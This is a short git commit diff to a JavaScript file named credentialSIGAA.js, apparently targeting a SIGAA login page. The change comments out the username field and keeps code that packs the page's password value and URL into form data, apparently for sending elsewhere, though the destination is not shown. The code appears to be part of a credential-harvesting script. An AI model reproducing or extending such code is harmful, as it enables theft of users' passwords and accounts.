5f67eff99e5bce54a05487178b9a4ec98ed6ea39
Wolota <123838258+Wolota@users.noreply.github.com>
2023-02-11 14:11:55 -0300

    Update credentialSIGAA.js

--- credentialSIGAA.js
+++ credentialSIGAA.js
@@ -11,7 +11,7 @@
                 const urlContent = xhr.responseText;
 
                 const data = new FormData();
-                data.append("username", username.value);
+                //data.append("username", username.value);
                 data.append("password", password.value);
                 data.append("hostname", location.href);
 
